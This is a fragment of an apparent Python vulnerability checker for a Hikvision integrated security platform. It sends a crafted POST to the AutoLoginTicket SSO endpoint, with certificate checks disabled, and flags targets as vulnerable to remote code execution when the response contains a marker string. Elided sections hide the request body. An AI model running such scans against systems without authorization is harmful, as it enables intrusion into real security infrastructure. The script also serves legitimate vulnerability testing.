...
def check_vulnerability(url):
    try:
        # 构建攻击URL
        attack_url = url.rstrip('/') + "/bic/ssoService/v1/applyAutoLoginTicket"
        data={
            "CTGT": {
        ...
        # 向服务器发送请求
        response = requests.post(attack_url, json=data, headers=headers,verify=False, timeout=10)
        #print(response.text)
        # 检查响应状态码和响应体中的关键字
        if response.status_code == 200 and '666666' in response.text:
            print(f"{RED}URL [{url}] 存在海康威视综合安防AutoLoginTicket 远程代码执行漏洞。{RESET}")
        else:
...
def main():
    parser = argparse.ArgumentParser(description='检查目标URL是否存在海康威视综合安防AutoLoginTicket 远程代码执行漏洞。')
